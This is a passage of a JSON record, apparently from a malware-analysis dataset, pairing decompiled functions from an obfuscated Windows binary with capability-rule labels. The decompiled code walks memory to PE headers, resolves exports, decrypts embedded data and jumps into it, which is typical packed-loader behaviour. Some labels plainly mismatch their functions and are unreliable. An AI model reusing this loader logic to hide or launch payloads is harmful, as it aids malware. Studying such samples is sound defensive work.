{
    "00401126": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401126(int32_t *arg_8h)\n\n{\n    return *arg_8h << 1;\n}\n",
        "token_count": 34
    },
    "00401133": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00401133(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    uint uVar6;\n    int32_t **ppiVar7;\n    int32_t iStack320;\n    uint32_t uStack316;\n    uint uStack268;\n    uint16_t uStack204;\n    char cStack201;\n    uint uStack188;\n    int32_t iStack184;\n    uint uStack180;\n    uint uStack156;\n    int32_t iStack152;\n    int32_t iStack148;\n    char cStack141;\n    ushort uStack140;\n    uchar uStack137;\n    uint uStack136;\n    int32_t *piStack128;\n    uint uStack124;\n    uchar auStack119 [6];\n    uchar uStack113;\n    int32_t iStack112;\n    uint16_t uStack106;\n    int32_t *piStack104;\n    int32_t iStack100;\n    uint32_t uStack96;\n    uint uStack92;\n    uint *puStack88;\n    int32_t iStack84;\n    uint uStack80;\n    int32_t iStack76;\n    int16_t iStack70;\n    ushort uStack68;\n    uchar uStack65;\n    uint32_t uStack64;\n    uint32_t uStack60;\n    int32_t iStack56;\n    char cStack49;\n    uint uStack48;\n    ushort uStack44;\n    ushort uStack42;\n    uint uStack40;\n    char cStack25;\n    uchar uStack21;\n    uint var_ch;\n    \n    uStack40 = uStack40 & 0x4effffff;\n    uStack21 = 0x35;\n    uStack42 = 0x1974;\n    uStack48 = 0x52937590;\n    uStack113 = 0x51;\n    uStack136 = 0;\n    uStack137 = uStack40._3_1_;\n    uStack140 = uStack40;\n    iStack148 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0);\n    iStack152 = &uStack136 + 3;\n    uStack156 = CONCAT13(0x37, uStack156);\n    uStack44 = 0;\n    uStack40 = uStack40 * 2;\n    uStack42 = CONCAT11(0x1f, uStack42);\n    uStack136 = uStack136 & 0xffffff | 0x37 - cStack25 << 0x18;\n    uVar1 = (*_sym.imp.USER32.dll_CreateIconFromResource)(&uStack136 + 3, 0x361, 0x771, 0xb53);\n    iStack56 = uStack180;\n    piStack104 = 0xf43;\n    ppiVar7 = &piStack104;\n    uVar6 = 0xed6ce2;\n    (*_sym.imp.KERNEL32.dll_GetConsoleMode)(0xed6ce2, ppiVar7);\n    uStack64 = uStack188 | 0x444a3d15;\n    if (*(iStack184 + 0xa4) < 6) {\ncode_r0x004019e6:\n        bVar5 = 0x9dfe7652 < uStack60;\n        uStack60 = uStack60 + 0x620189ad;\n        iStack56 = iStack56 + bVar5;\n    }\n    else {\n        iVar2 = fcn.0041e715();\n        uStack65 = 0xff;\n        iStack84 = 0;\n        if (*(iVar2 + *(iVar2 + 0x3c)) == 0x4550) {\n            iStack84 = iVar2 + *(iVar2 + 0x3c);\n        }\n        bVar5 = 0x5f5a95eb < uStack60;\n        uStack60 = 0x5f5a95eb - uStack60;\n        iStack56 = -bVar5 - iStack56;\n        uStack106 = *(iStack84 + 0x48);\n        if (uStack106 < 6) goto code_r0x004019e6;\n        uStack65 = 0;\n        uStack64 = uStack188 * 2;\n        if (uStack106 != 0x197aU - iStack70 || *(iStack84 + 0x4a) != 0) {\n            uStack68 = 0x845b;\n            iVar2 = fcn.0041e58b();\n            if ((iVar2 == 0) && (cStack141 != -0x2f - cStack49)) {\n                uVar6 = 0x4f7;\n                (*_sym.imp.GDI32.dll_CreateCompatibleBitmap)(0xd53521, iStack76 + -0x52936fa2, 0x4f7);\n                uStack80 = CONCAT22(uStack80._2_2_, -0x22ad - uStack180);\n                (*_sym.imp.USER32.dll_PhysicalToLogicalPoint)(0x35b00c, &uStack136);\n                puStack88 = puStack88 & 0xffffff | uStack188._3_1_ + 0x6f << 0x18;\n                ppiVar7 = 0x28ddc6;\n                (*_sym.imp.ADVAPI32.dll_CryptDestroyKey)(0x28ddc6);\n            }\n        }\n    }\n    piStack128 = &iStack148;\n    uStack80 = &uStack156;\n    iStack100 = 0;\n    piStack104 = piStack128;\n    do {\n        iVar2 = iStack100;\n        iVar3 = 0x52937591 - iStack76;\n        iStack152 = 0;\n        uStack156 = 0;\n        uStack64 = uStack188 ^ 0xffffffff;\n        uStack68 = 0x1eaa;\n        *piStack128 = &uStack156;\n        (*_sym.imp.ADVAPI32.dll_QueryUsersOnEncryptedFile)(0x4373f4, &iStack148, uVar6, ppiVar7);\n        uStack65 = 0;\n        iStack100 = iVar2 + iVar3;\n        uStack64 = uStack188 ^ 0x23023757;\n    } while (iStack100 != 0xf);\n    puStack88 = &uStack92;\n    uVar4 = uStack60 ^ 0x5fa4b6b4;\n    uStack60 = uVar4 * 2 + 0x7873b35;\n    iStack56 = iStack56 * 2 + CARRY4(uVar4, uVar4) + (0xf878c4ca < uVar4 * 2);\n    uStack92 = 0x35e;\n    uStack65 = 0;\n    (*_sym.imp.USER32.dll_GetPriorityClipboardFormat)(&uStack92, 0x93d);\n    (*_sym.imp.GDI32.dll_StrokePath)(0x2cb9da);\n    iStack76 = 0x42fd6cf2;\n    uStack80 = uStack80 & 0xffffff | uStack180._3_1_ + 0x33 << 0x18;\n    auStack119[0] = 2;\n    (*_sym.imp.USER32.dll_CreateIconFromResource)(auStack119, 0x361, 0x771, uStack268);\n    uStack96 = (uVar1 & 0xff000000 | uStack96 & 0xffffff) ^ 0xff000000;\n    uStack124 = 0x2cb9da;\n    (*_sym.imp.KERNEL32.dll_GetConsoleMode)(0xed6ce2, &uStack124);\n    if (uStack316 <= *(iStack320 + 0xa4)) {\n        iVar2 = fcn.0041e715();\n        uStack204 = &piStack104;\n        piStack104._0_3_ = piStack104 & 0xff0000;\n        iStack152 = 0;\n        if (*(iVar2 + *(iVar2 + 0x3c)) == iStack112 + -0x52933040) {\n            iStack152 = iVar2 + *(iVar2 + 0x3c);\n        }\n        cStack201 = &piStack104 >> 0x18;\n        piStack104 = CONCAT13('\\x16' - cStack201, piStack104 | uStack204 * -0x3572);\n        uStack92 = 0;\n        uStack96 = 0x625db608;\n        if (5 < *(iStack152 + 0x48)) {\n            uVar1 = (&piStack104 & 0xff000000 | piStack104 | &piStack104 & 0xffff) ^ 0x9000000;\n            piStack104 = uVar1 & 0xffffb8aa;\n            if (*(iStack152 + 0x48) != 6 || *(iStack152 + 0x4a) != 0x1974 - uStack106) {\n                piStack104 = uVar1 & 0xffff0000 | ~uStack204;\n                iVar2 = iStack112 + -0x52937590;\n                iVar3 = fcn.0041e58b();\n                if (iVar3 == iVar2) {\n                    iStack100 = 0x4373f4;\n                    iVar2 = fcn.0041ec16();\n                    return iVar2;\n                }\n            }\n            goto code_r0x00401a0c;\n        }\n    }\n    iStack100 = 0x7bfe0713;\ncode_r0x00401a0c:\n    (*_sym.imp.KERNEL32.dll_FlsGetValue)(0xe33);\n    return 0x529375f2 - iStack112;\n}\n",
        "token_count": 2192
    },
    "0041ec16": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.0041ec16(void)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    code *pcStack200;\n    uint auStack192 [2];\n    uint uStack184;\n    code *pcStack176;\n    int16_t *piStack172;\n    uint uStack168;\n    int32_t *piStack164;\n    uint32_t uStack160;\n    uchar auStack156 [40];\n    uint uStack116;\n    uint uStack112;\n    int16_t *piStack92;\n    int32_t iStack88;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    int32_t iStack48;\n    uint16_t uStack42;\n    uint uStack40;\n    uint uStack36;\n    uint8_t uStack25;\n    int32_t iStack24;\n    uint var_ch;\n    \n    uVar2 = uStack42;\n    iStack24 = 0x71bbfd04;\n    uStack36 = 0;\n    uStack40 = 0x7c96864b;\n    iStack48 = fcn.0041e22c(auStack192);\n    uStack116 = auStack192[0];\n    uStack112 = 0x13600;\n    uStack56 = *0x42118c;\n    uStack60 = *0x421188;\n    uStack64 = *0x421194;\n    uStack52 = *0x421190;\n    uStack68 = *0x421198;\n    pcStack200 = fcn.0041e8f5;\n    do {\n        piVar1 = pcStack200;\n        if (*pcStack200 == 0x5a4d) {\n            piStack164 = pcStack200 + *(pcStack200 + 0x3c);\n            if (*piStack164 == 0x4550) {\n                uStack36 = 0;\n                uStack40 = 0xa2f9efe5;\n                piStack92 = pcStack200;\n                uStack42 = uStack42 + 0xebad;\n                iStack88 = piStack164[0x14];\n                iStack48 = iStack48 + 0x30edaf4b;\n                uStack25 = uStack25 | 0xd1;\n                pcStack176 = fcn.0041eb53(auStack156, uStack184);\n                uStack42 = uVar2 & 0x18df;\n                uStack168 = 0;\n                if (pcStack176 != NULL) {\n                    (*pcStack176)(auStack156);\n                    uStack168 = 0xca;\n                }\n                return uStack168;\n            }\n        }\n        do {\n            uStack160 = iStack24 + 0xf157f739;\n        } while (uStack160 < 0x4c40e51);\n        pcStack200 = pcStack200 + -0x1000 & 0xfffff000;\n        piStack172 = piVar1;\n    } while( true );\n}\n",
        "token_count": 685
    },
    "00401d06": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint __cdecl fcn.00401d06(int32_t arg_8h, uint noname_1, int32_t arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    int32_t iStack56;\n    uint uStack52;\n    uint var_8h;\n    \n    uStack52 = 0;\n    if (arg_8h != 0) {\n        iStack56 = 0;\n        do {\n            *(arg_10h + iStack56) = *(iStack56 + 0x4373ab) - *(iStack56 + 0x4373e3);\n            iStack56 = iStack56 + 1;\n        } while (iStack56 != 0xe);\n        uVar1 = fcn.0041efe5();\n        uVar1 = fcn.0041b2f6(uVar1, arg_10h);\n        *arg_14h = uVar1;\n        *(arg_8h + 4) = 0x13600;\n        *(arg_8h + 0xc) = 0x4410;\n        uStack52 = 1;\n    }\n    return uStack52;\n}\n",
        "token_count": 277
    },
    "0041ae98": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_eh\n\nint32_t __cdecl fcn.0041ae98(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_14h;\n    uint var_eh;\n    \n    var_1ch = 0;\n    iVar1 = var_1ch;\n    do {\n        var_1ch = iVar1;\n        iVar1 = var_1ch + 1;\n    } while (*(arg_8h + var_1ch) != '\\0');\n    return var_1ch;\n}\n",
        "token_count": 142
    },
    "0041aee9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t __cdecl fcn.0041aee9(int32_t arg_8h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uStack92;\n    uint16_t *puStack80;\n    uint32_t uStack56;\n    uint var_bp_ch;\n    \n    iVar4 = fcn.0041e715();\n    iVar5 = 0;\n    if (*(iVar4 + *(iVar4 + 0x3c)) == 0x4550) {\n        iVar5 = iVar4 + *(iVar4 + 0x3c);\n    }\n    iVar5 = *(iVar5 + 0x78);\n    uVar3 = *(iVar4 + 0x18 + iVar5);\n    if (uVar3 != 0) {\n        puStack80 = iVar4 + *(iVar4 + iVar5 + 0x24);\n        uStack56 = 0;\n        do {\n            uStack92 = 0;\n            do {\n                cVar1 = *(iVar4 + *(iVar4 + *(iVar4 + 0x20 + iVar5) + uStack56 * 4) + uStack92);\n                cVar2 = *(arg_8h + uStack92);\n                if (cVar1 == '\\0') break;\n                uStack92 = uStack92 + 1;\n            } while ((cVar2 != '\\0' && cVar1 == cVar2) && uStack92 < 0x20);\n            if (cVar1 == cVar2) {\n                return iVar4 + *(iVar4 + *(iVar4 + iVar5 + 0x1c) + *puStack80 * 4);\n            }\n            puStack80 = puStack80 + 1;\n            uStack56 = uStack56 + 1;\n        } while (uStack56 < uVar3);\n    }\n    return 0;\n}\n",
        "token_count": 445
    },
    "0041b2f6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x0041b687)\n\nuint __cdecl fcn.0041b2f6(uint arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    ushort uStack136;\n    char acStack132 [32];\n    code *pcStack100;\n    ushort uStack96;\n    ushort uStack94;\n    int32_t iStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uchar uStack77;\n    uint uStack76;\n    uint32_t uStack72;\n    uint uStack68;\n    uint16_t uStack62;\n    uint32_t uStack60;\n    uint uStack56;\n    ushort uStack50;\n    int32_t iStack48;\n    uchar uStack41;\n    uint uStack40;\n    uint uStack36;\n    uint uStack28;\n    ushort uStack24;\n    uint16_t uStack22;\n    uint var_ch;\n    \n    uStack22 = 0xe84d;\n    iStack48 = 0x17ce5d0c;\n    uStack62 = 0x7b6;\n    uStack84 = 0;\n    uStack88 = 0x5c124353;\n    uStack77 = 0x5c;\n    uStack41 = 0x5c;\n    uStack72 = 0;\n    do {\n        acStack132[uStack72] = *(uStack72 + 0x437393) - *((uStack72 & 0xf) + 0x4373e3);\n        uStack72 = uStack72 + 1;\n    } while (uStack72 != 0x18);\n    uStack40 = 0x41011d01;\n    uStack36 = 0;\n    uStack56 = 0;\n    if (arg_ch != 0) {\n        uStack24 = 0;\n        pcStack100 = fcn.0041aee9(acStack132);\n        uStack56 = 0;\n        if (pcStack100 != NULL) {\n            do {\n                iStack92 = arg_ch;\n                uVar1 = 0x17ce5d0c - iStack48;\n                while (uStack60 = uVar1,  (uStack22 ^ 0x4b4c) != uStack62) {\n                    uStack36 = 0;\n                    uStack40 = 0;\n                    uVar1 = uStack60 + 1;\n                    if (*(arg_ch + uStack60) == '\\0') {\n                        uStack136 = uStack60;\n                        uStack50 = uStack136;\n                        uStack68 = 0;\n                        if ((uStack88 < 0x45abf12d) <= uStack84) {\n                            uStack96 = uStack136;\n                            uStack94 = uStack136;\n                            uStack68 = 0;\n                            if ((uStack60 & 0xffff) != 0) {\n                                uStack41 = 0x4c;\n                                uStack76 = 0;\n                                uStack28 = 0x8808168;\n                                uStack24 = 0;\n                                uStack60 = uStack60 + 1;\n                                (*pcStack100)(arg_8h, &uStack96, 0, &uStack76);\n                                uStack68 = uStack76;\n                            }\n                        }\n                        return uStack68;\n                    }\n                }\n            } while( true );\n        }\n    }\n    return 0;\n}\n",
        "token_count": 773
    },
    "0041b8b1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t * __cdecl fcn.0041b8b1(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int16_t iVar3;\n    int32_t in_FS_OFFSET;\n    bool bVar4;\n    int32_t *piStack88;\n    uint32_t uStack52;\n    uint var_ch;\n    \n    iVar1 = *(*(*(in_FS_OFFSET + 0x18) + 0x30) + 0xc);\n    piVar2 = iVar1 + 0x14;\n    piStack88 = *(iVar1 + 0x14);\n    if (piStack88 != piVar2) {\n        do {\n            if (piStack88[4] == arg_ch && arg_ch != NULL) {\n                return piStack88 + -2;\n            }\n            if (*(piStack88 + 9) >> 1 != 0) {\n                uStack52 = 0;\n                do {\n                    iVar3 = *(piStack88[10] + uStack52 * 2);\n                    if (iVar3 - 0x41U < 0x1a) {\n                        iVar3 = iVar3 + 0x20;\n                    }\n                    bVar4 = *(arg_8h + uStack52 * 2) == iVar3;\n                    uStack52 = uStack52 + 1;\n                } while ((bVar4 && iVar3 != 0) && uStack52 < *(piStack88 + 9) >> 1);\n                if (bVar4) {\n                    return piStack88[4];\n                }\n            }\n            piStack88 = *piStack88;\n        } while (piStack88 != piVar2);\n    }\n    return NULL;\n}\n",
        "token_count": 399
    },
    "0041bc64": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Removing unreachable block (ram,0x0041bce7)\n\nint16_t * __cdecl fcn.0041bc64(int32_t arg_8h)\n\n{\n    int16_t *piStack56;\n    code *pcStack44;\n    uint var_8h;\n    \n    if (arg_8h == 0) {\n        for (pcStack44 = fcn.0041e8f5;\n            (*pcStack44 != 0x5a4d || (piStack56 = pcStack44,  *(pcStack44 + *(pcStack44 + 0x3c)) != 0x4550));\n            pcStack44 = pcStack44 + -0x1000 & 0xfffff000) {\n        }\n    }\n    else {\n        piStack56 = fcn.0041b8b1(arg_8h, 0);\n    }\n    return piStack56;\n}\n",
        "token_count": 216
    },
    "0041bec5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl fcn.0041bec5(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    char cVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    int32_t iStack364;\n    uint8_t uStack345;\n    uint32_t uStack344;\n    uint8_t auStack299 [77];\n    char cStack222;\n    char cStack43;\n    uint16_t uStack42;\n    uint32_t uStack40;\n    char cStack33;\n    uint32_t uStack32;\n    int32_t iStack24;\n    uint var_bp_ch;\n    \n    uVar5 = uStack32;\n    cVar4 = cStack33;\n    uVar3 = uStack42;\n    uStack40 = 0x1c697161;\n    cStack43 = 'q';\n    iStack24 = 0x668402b2 - iStack24;\n    uStack345 = 0xa6;\n    uStack344 = 0;\n    do {\n        cStack33 = 0xf7;\n        for (uVar7 = *(uStack344 * 4 + 0x4211a0); uVar7 < arg_10h; uVar7 = uVar7 + 0x25) {\n            uVar8 = uVar7 * uStack344 + 4 ^ uStack345;\n            uStack42 = uVar3 ^ 0xffff;\n            uVar1 = *(*0x42119c + uVar7 % 0x29);\n            uStack345 = uVar8;\n            uVar8 = uVar8 & 0xff;\n            uVar2 = auStack299[uVar8];\n            *(arg_8h + uVar7) = *(arg_ch + uVar7) - uVar1;\n            auStack299[uVar8] = uVar1 ^ uVar2 + 1;\n            cStack33 = cVar4 * '\\x02';\n        }\n        uStack42 = uVar3 ^ 0xffff;\n        cStack222 = cStack43 + -0x71;\n        uStack344 = uStack344 + 1;\n    } while (uStack344 != (uStack40 ^ 0x1c697144));\n    iStack24 = 0;\n    iStack364 = 0;\n    iVar6 = iStack364;\n    do {\n        iStack364 = iVar6;\n        uStack32 = uVar5 ^ 0x96ee42a;\n        uStack42 = uVar3 * 0x6eb3;\n        iVar6 = iStack364 + 1;\n    } while (auStack299[iStack364] != 0);\n    uVar9 = 0;\n    if (iStack364 == 0x100) {\n        uVar9 = 0x42;\n    }\n    return uVar9;\n}\n",
        "token_count": 691
    },
    "0041c27f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041c929)\n// WARNING: Removing unreachable block (ram,0x0041e0f0)\n// WARNING: Removing unreachable block (ram,0x0041dded)\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0041c27f(void)\n\n{\n    char *pcVar1;\n    uint32_t *puVar2;\n    ushort uVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    char extraout_CL;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint extraout_ECX_05;\n    uint extraout_ECX_06;\n    uint extraout_ECX_07;\n    uint extraout_ECX_08;\n    uint extraout_ECX_09;\n    uint extraout_ECX_10;\n    uint extraout_ECX_11;\n    uint extraout_ECX_12;\n    uint extraout_ECX_13;\n    uint extraout_ECX_14;\n    uint extraout_ECX_15;\n    uint extraout_ECX_16;\n    uint extraout_ECX_17;\n    uint extraout_ECX_18;\n    uint extraout_ECX_19;\n    uint32_t extraout_ECX_20;\n    uint extraout_ECX_21;\n    uint extraout_ECX_22;\n    uint extraout_ECX_23;\n    uint extraout_ECX_24;\n    uint extraout_ECX_25;\n    uint extraout_ECX_26;\n    uint extraout_ECX_27;\n    uint extraout_ECX_28;\n    uint extraout_ECX_29;\n    uint extraout_ECX_30;\n    uint extraout_ECX_31;\n    uint extraout_ECX_32;\n    uint extraout_ECX_33;\n    uint extraout_ECX_34;\n    uint extraout_ECX_35;\n    uint extraout_ECX_36;\n    uint extraout_ECX_37;\n    uint extraout_ECX_38;\n    uint extraout_ECX_39;\n    uint extraout_ECX_40;\n    uint extraout_ECX_41;\n    uint extraout_ECX_42;\n    uint extraout_ECX_43;\n    uint extraout_ECX_44;\n    uint32_t extraout_ECX_45;\n    uint extraout_ECX_46;\n    uint extraout_ECX_47;\n    uint extraout_ECX_48;\n    uint extraout_ECX_49;\n    uint32_t extraout_ECX_50;\n    uint extraout_ECX_51;\n    uint extraout_ECX_52;\n    uint32_t extraout_ECX_53;\n    uint extraout_ECX_54;\n    uint extraout_ECX_55;\n    uint extraout_ECX_56;\n    uint extraout_ECX_57;\n    uint extraout_ECX_58;\n    uint extraout_ECX_59;\n    uint extraout_ECX_60;\n    uint extraout_ECX_61;\n    uint extraout_ECX_62;\n    uint extraout_ECX_63;\n    uint extraout_ECX_64;\n    uint extraout_ECX_65;\n    uint extraout_ECX_66;\n    uint extraout_ECX_67;\n    uint extraout_ECX_68;\n    uint extraout_ECX_69;\n    uint extraout_ECX_70;\n    uint extraout_ECX_71;\n    uint32_t unaff_ESI;\n    int32_t *piVar8;\n    int32_t *piVar9;\n    int32_t *piVar10;\n    int32_t *piVar11;\n    unkbyte6 Var12;\n    ushort uStackY172;\n    uint uVar13;\n    int32_t iStack164;\n    uint32_t uStack156;\n    uint uStack148;\n    uint32_t uStack144;\n    uint32_t uStack132;\n    int32_t *piStack128;\n    uint32_t uStack120;\n    uint32_t uStack116;\n    uint32_t uStack104;\n    uint8_t uStack87;\n    uint32_t uStack72;\n    int32_t iStack68;\n    uint uStack36;\n    uint uStack28;\n    int32_t *piStack24;\n    \n    uVar4 = unaff_ESI & 0xffff0000 | uStack28._2_2_;\n    uStack116 = CONCAT13(0x5f, uStack116);\n    piStack128 = 0x172c7f5b;\n    Var12 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    puVar2 = uVar4 + 0x913bf16a;\n    *puVar2 = *puVar2 ^ 0x43;\n    pcVar1 = uVar4 + 0x71;\n    *pcVar1 = *pcVar1 - extraout_ECX;\n    pcVar1 = Var12 + -0x69;\n    *pcVar1 = *pcVar1 + -1;\n    _pe_dos_header = in(Var12 >> 0x20);\n    _pe_dos_header = _pe_dos_header + -0x5078ceda;\n    uVar4 = in(uStackY172);\n    uStack104 = 0xa77eec08;\n    uStack144 = uStack28._2_2_;\n    if ((uVar4 & 0x588113f8) == 0) {\n        Var12 = (*0x41f3ba)(extraout_ECX);\n        *0x917de524 = *0x917de524 ^ 0x43;\n        *0x41f42b = *0x41f42b - extraout_ECX_56;\n        pcVar1 = Var12 + -0x69;\n        *pcVar1 = *pcVar1 + -1;\n        _pe_dos_header = in(Var12 >> 0x20);\n        _pe_dos_header = _pe_dos_header + -0x5078ceda;\n        iVar7 = in(0xdc1c);\n        uStack104 = 0xfffffff8;\n        if (iVar7 == 0) {\n            Var12 = (*_sym.imp.USER32.dll_DeferWindowPos)(extraout_ECX_56);\n            *0x913bf16a = *0x913bf16a ^ 0x43;\n            *0x71 = *0x71 - extraout_ECX_00;\n            pcVar1 = Var12 + -0x69;\n            *pcVar1 = *pcVar1 + -1;\n            *0x4 = in(Var12 >> 0x20);\n            *0x4 = *0x4 + -0x5078ceda;\n            in(iStack164);\n            iStack164 = 0x41c485;\n            Var12 = (*_sym.imp.KERNEL32.dll_GetShortPathNameA)(extraout_ECX_00);\n            *0x913bf16a = *0x913bf16a ^ 0x43;\n            *0x71 = *0x71 - extraout_ECX_01;\n            pcVar1 = Var12 + -0x69;\n            *pcVar1 = *pcVar1 + -1;\n            *0x8 = in(Var12 >> 0x20);\n            *0x8 = *0x8 + -0x5078ceda;\n            piVar11 = 0xc;\n            piVar5 = in(0xc44d);\n            uStack36 = 0;\n            uVar13 = extraout_ECX_01;\n            uStack148 = extraout_ECX;\n            if (piVar5 == NULL) goto code_r0x0041ce33;\n            do {\n                Var12 = (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryA)(uVar13);\n                *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_18;\n                pcVar1 = Var12 + -0x69;\n                *pcVar1 = *pcVar1 + -1;\n                iVar7 = in(Var12 >> 0x20);\n                piVar8 = piVar11 + 1;\n                *piVar11 = iVar7 + -0x5078ceda;\n                iVar7 = in(0xcb2e);\n                uVar13 = extraout_ECX_18;\n                if (iVar7 != -0x588113f7) goto code_r0x0041d627;\n                Var12 = (*_sym.imp.SHELL32.dll_ExtractIconA)(extraout_ECX_18);\n                *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_09;\n                pcVar1 = Var12 + -0x69;\n                *pcVar1 = *pcVar1 + -1;\n                iVar7 = in(Var12 >> 0x20);\n                piVar10 = piVar11 + 2;\n                *piVar8 = iVar7 + -0x5078ceda;\n                iVar7 = in(0xc857);\n                piVar8 = piVar10;\n                uVar13 = extraout_ECX_09;\n                if (iVar7 == 0) {\ncode_r0x0041d779:\n                    Var12 = (*_sym.imp.GDI32.dll_GetLogColorSpaceA)(uVar13);\n                    *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                    *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_47;\n                    pcVar1 = Var12 + -0x69;\n                    *pcVar1 = *pcVar1 + -1;\n                    iVar7 = in(Var12 >> 0x20);\n                    *piVar8 = iVar7 + -0x5078ceda;\n                    in(iStack164);\n                    iStack164 = 0x41d7d0;\n                    Var12 = (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(extraout_ECX_47);\n                    *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                    *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_48;\n                    pcVar1 = Var12 + -0x69;\n                    *pcVar1 = *pcVar1 + -1;\n                    iVar7 = in(Var12 >> 0x20);\n                    piVar8[1] = iVar7 + -0x5078ceda;\n                    iVar7 = in(0xd798);\n                    uVar4 = piVar5 & 0xffff0000 | uStack144 & 0xffff;\n                    piVar11 = piVar8 + 2 & 0xffff0000 | uStack144 & 0xffff ^ 0x7b1a;\n                    if (iVar7 != 0) {\n                        return 0xfffffff6;\n                    }\n                    Var12 = (*_sym.imp.KERNEL32.dll_LocalUnlock)(extraout_ECX_48);\n                    *(uVar4 + 0x913bf16a) = *(uVar4 + 0x913bf16a) ^ 0x43;\n                    *(uVar4 + 0x71) = *(uVar4 + 0x71) - extraout_ECX_24;\n                    pcVar1 = Var12 + -0x69;\n                    *pcVar1 = *pcVar1 + -1;\n                    iVar7 = in(Var12 >> 0x20);\n                    *piVar11 = iVar7 + -0x5078ceda;\n                    uVar6 = 